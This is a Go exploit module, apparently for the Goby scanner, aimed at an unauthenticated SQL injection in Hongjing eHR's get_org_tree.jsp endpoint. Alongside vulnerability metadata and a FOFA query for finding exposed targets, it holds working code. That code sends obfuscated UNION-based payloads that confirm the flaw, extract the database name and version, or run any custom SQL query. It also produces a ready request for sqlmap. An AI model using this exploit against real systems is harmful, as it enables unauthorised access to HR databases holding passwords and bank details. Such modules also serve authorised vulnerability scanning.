package exploits

import (
	"crypto/md5"
	"encoding/hex"
	"errors"
	"fmt"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"regexp"
	"strings"
)

func init() {
	expJson := `{
    "Name": "Hongjing eHR /templates/attestation/../../hire/zp_options/get_org_tree.jsp SQL Injection Vulnerability",
    "Description": "<p>Hongjing eHR human resource management software is a software that integrates human resource management Q with digital applications, meeting the needs of dynamic, collaborative, procedural, and strategic management.Hongjing eHR/templates/attestation/..// There is an SQL injection vulnerability at the hire/zp_options/get_org_tree.jsp interface, which can be exploited by unauthenticated remote attackers to execute arbitrary SQL instructions and steal sensitive database information.</p>",
    "Product": "Hongjing eHR",
    "Homepage": "http://www.hjsoft.com.cn/#/",
    "DisclosureDate": "2024-11-13",
    "PostTime": "2024-11-13",
    "Author": "wangzhao@baimaohui.net",
    "FofaQuery": "title=\"人力资源\" && body=\"hcm/themes\"",
    "GobyQuery": "title=\"人力资源\" && body=\"hcm/themes\"",
    "Level": "2",
    "Impact": "<p>Attackers can access sensitive information in the database, such as user passwords, bank accounts, etc., leading to the leakage of user privacy.</p>",
    "Recommendation": "<p>1. Strictly verify and filter user input to ensure the legitimacy and security of input data. </p><p>2. The manufacturer has released a fixed version, please follow the official website <a href=\"http://www.hjsoft.com.cn/#/\">http://www.hjsoft.com.cn/#/</a></p>",
    "References": [
        "https://axsec.blog.csdn.net/article/details/135557835?spm=1001.2014.3001.5502"
    ],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "attackType",
            "type": "select",
            "value": "db_name,version,custom,sqlpoint",
            "show": ""
        },
        {
            "name": "custom",
            "type": "input",
            "value": "select/***//***/1,2,@@version",
            "show": "attackType=custom"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "SQL Injection"
    ],
    "VulType": [
        "SQL Injection"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "7.0",
    "Translation": {
        "CN": {
            "Name": "宏景eHR /templates/attestation/../../hire/zp_options/get_org_tree.jsp SQL 注入漏洞",
            "Product": "宏景eHR",
            "Description": "<p>宏景eHR人力资源管理软件是一款人力资源管理Q与数字化应用相融合，满足动态化、协同化、流程化、战略化需求的软件。<br>宏景eHR /templates/attestation/../../hire/zp_options/get_org_tree.jsp接口处存在SQL注入漏洞，未经过身份认证的远程攻击者可利用此漏洞执行任意SQL指令，从而窃取数据库敏感信息。<br></p>",
            "Recommendation": "<p>1、对用户输入进行严格的验证和过滤，确保输入数据的合法性和安全性。<br>2、该厂商已发布修复版本，关注官网<a href=\"http://www.hjsoft.com.cn/#/\">http://www.hjsoft.com.cn/#/</a></p>",
            "Impact": "<p>攻击者可以读取数据库中的敏感信息，如用户密码、银行账户等，导致用户隐私泄露。<br></p>",
            "VulType": [
                "SQL注入"
            ],
            "Tags": [
                "SQL注入"
            ]
        },
        "EN": {
            "Name": "Hongjing eHR /templates/attestation/../../hire/zp_options/get_org_tree.jsp SQL Injection Vulnerability",
            "Product": "Hongjing eHR",
            "Description": "<p>Hongjing eHR human resource management software is a software that integrates human resource management Q with digital applications, meeting the needs of dynamic, collaborative, procedural, and strategic management.Hongjing eHR/templates/attestation/..// There is an SQL injection vulnerability at the hire/zp_options/get_org_tree.jsp interface, which can be exploited by unauthenticated remote attackers to execute arbitrary SQL instructions and steal sensitive database information.<br></p>",
            "Recommendation": "<p>1. Strictly verify and filter user input to ensure the legitimacy and security of input data.&nbsp;</p><p>2. The manufacturer has released a fixed version, please follow the official website <a href=\"http://www.hjsoft.com.cn/#/\">http://www.hjsoft.com.cn/#/</a><br></p>",
            "Impact": "<p>Attackers can access sensitive information in the database, such as user passwords, bank accounts, etc., leading to the leakage of user privacy.<br></p>",
            "VulType": [
                "SQL Injection"
            ],
            "Tags": [
                "SQL Injection"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "Variables": {},
    "PocId": "9971"
}`

	setSqlPayloadwV7lbsgw := func(hostInfo *httpclient.FixUrl, sql string) (resp *httpclient.HttpResponse, vulurl string, err error) {
		setGetRequest := func(hostInfo *httpclient.FixUrl, url string, head map[string]string) (*httpclient.HttpResponse, error) {
			PostRequest := httpclient.NewPostRequestConfig(url)
			PostRequest.Timeout = 15
			PostRequest.VerifyTls = false
			PostRequest.FollowRedirect = false
			PostRequest.Data = "params=1%3c1/***//***//***//***//***//***//***//***//***//***//***//***//***//***//***//***//***//***//***//***//***//***//***//***//***//***//***//***//***//***//***//***//***//***//***//***//***//***//***//***//***//***//***//***//***//***//***//***//***//***//***//***//***//***//***//***//***//***/union/***//***/" + sql + ",4--+"
			for headName, headValue := range head {
				PostRequest.Header.Store(headName, headValue)
			}
			return httpclient.DoHttpRequest(hostInfo, PostRequest)
		}

		defineHeader := map[string]string{
			"User-Agent":      "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5672.93 Safari/537.36",
			"Accept-Encoding": "gzip, deflate",
			"Content-Type":    "application/x-www-form-urlencoded",
			"Connection":      "close",
		}

		urlget := "/templates/attestation/../../hire/zp_options/get_org_tree.jsp"
		resp, err = setGetRequest(hostInfo, urlget, defineHeader)

		if resp == nil {
			return nil, "", errors.New("Fail")
		}

		if err != nil {
			return resp, "", err
		}
		//配置漏洞存在的路径
		vulurl = "/templates/attestation/../../hire/zp_options/get_org_tree.jsp"

		return resp, vulurl, nil
	}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, hostInfo *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			// 1.配置验证poc时返回包需存在的字符串，exmple:以mysql的报错注入为例，XPATH syntax error
			checkValue := goutils.RandomHexString(6)
			hash := md5.New()
			hash.Write([]byte(checkValue))
			content := hex.EncodeToString(hash.Sum(nil)) //装换为md5值 后续用与验证

			// 2. 设置sql语句,同样这个sql语句要设置到，exp_params中的custom参数中
			// 默认是MySQL / MariaDB数据库 : 用DATABASE()查询数据库名，用CONCAT()拼接字符, example:CONCAT(0x7e,(select user()),0x7e)
			// PostgreSQL : 用current_database()查询数据库名，用CONCAT()拼接字符
			// SQLite : 用database_list查询数据库名，用||拼接字符
			// SQL Server : 用DB_NAME()查询数据库名，用+拼接字符
			// Oracle : 用SELECT name FROM v$database查询数据库名，用concat()拼接字符
			sql := "select/***//***/1,2,LOWER(CONVERT(VARCHAR(32),HASHBYTES('MD5','" + checkValue + "'),2))"

			// 3.设置正则表达式，用于匹配漏洞返回包中的数据
			sendPayload := setSqlPayloadwV7lbsgw
			resp, vulurl, err := sendPayload(hostInfo, sql)
			if err != nil {
				return false
			}

			if !strings.Contains(resp.RawBody, content) {
				return false
			}

			if err != nil {
				return false
			}

			// 拼接SQL注入数据包的请求路径即可
			ss.VulURL = hostInfo.HostInfo + vulurl
			return true
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			// 1.配置验证poc时返回包需存在的字符串，exmple:以mysql的报错注入为例，XPATH syntax error
			defaultModeMap := map[string]string{
				"db_name": "select/***//***/1,2,DB_NAME()",
				"version": "select/***//***/1,2,@@version",
			}
			//content := "XPATH syntax error"
			// 2.配置sqlpoint，供sqlmap工具使用
			sqlpoint := "POST /templates/attestation/../../hire/zp_options/get_org_tree.jsp HTTP/1.1\n" +
				"Host: " + expResult.HostInfo.HostInfo + "\n" +
				"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36\n" +
				"Content-Type: application/x-www-form-urlencoded; charset=UTF-8\n\n" +
				"params=1%3c1/***//***//***//***//***//***//***//***//***//***//***//***//***//***//***//***//***//***//***//***//***//***//***//***//***//***//***//***//***//***//***//***//***//***//***//***//***//***//***//***//***//***//***//***//***//***//***//***//***//***//***//***//***//***//***//***//***//***/union/***//***/select/***//***/1,2,LOWER(CONVERT(VARCHAR(32),HASHBYTES('MD5','123456'),2)),4--+"
			// 3.配置正则语句，从响应包中提取出数据
			regular := `id="2" text="(.*?)"`

			makeRegular := func(RegularContent string, RegularUrl string) (string, error) {
				reRequest := regexp.MustCompile(RegularUrl)
				if !reRequest.MatchString(RegularContent) {
					return "", fmt.Errorf("can't match value")
				}
				getname := reRequest.FindStringSubmatch(RegularContent)
				return getname[1], nil
			}
			sendPayload := setSqlPayloadwV7lbsgw
			attacktype := goutils.B2S(ss.Params["attackType"])
			if attacktype == "custom" {
				sql := goutils.B2S(ss.Params["custom"])
				resp, _, err := sendPayload(expResult.HostInfo, sql)
				if err != nil {
					expResult.Success = false
					expResult.Output = "利用失败"
				}
				output, err := makeRegular(resp.RawBody, regular)
				if err != nil || output == "" {
					expResult.Success = false
					expResult.Output = "正则匹配失败:\n" + err.Error()
					return expResult
				}
				expResult.Success = true
				expResult.Output = output
			} else if attacktype == "db_name" {
				sql := defaultModeMap["db_name"]
				resp, _, err := sendPayload(expResult.HostInfo, sql)
				if err != nil {
					expResult.Success = false
					expResult.Output = "利用失败"
				}
				output, err := makeRegular(resp.RawBody, regular)
				if err != nil || output == "" {
					expResult.Success = false
					expResult.Output = "正则匹配失败:\n" + err.Error()
					return expResult
				}
				expResult.Success = true
				expResult.Output = output
			} else if attacktype == "version" {
				sql := defaultModeMap["version"]
				resp, _, err := sendPayload(expResult.HostInfo, sql)
				if err != nil {
					expResult.Success = false
					expResult.Output = "利用失败"
				}
				output, err := makeRegular(resp.RawBody, regular)
				if err != nil || output == "" {
					expResult.Success = false
					expResult.Output = "正则匹配失败:\n" + err.Error()
					return expResult
				}
				expResult.Success = true
				expResult.Output = output
			} else if attacktype == "sqlpoint" {
				expResult.Success = true
				expResult.Output = sqlpoint
			} else {
				expResult.Success = false
				expResult.Output = "未知的利用方式"
			}
			return expResult
		},
	))
}
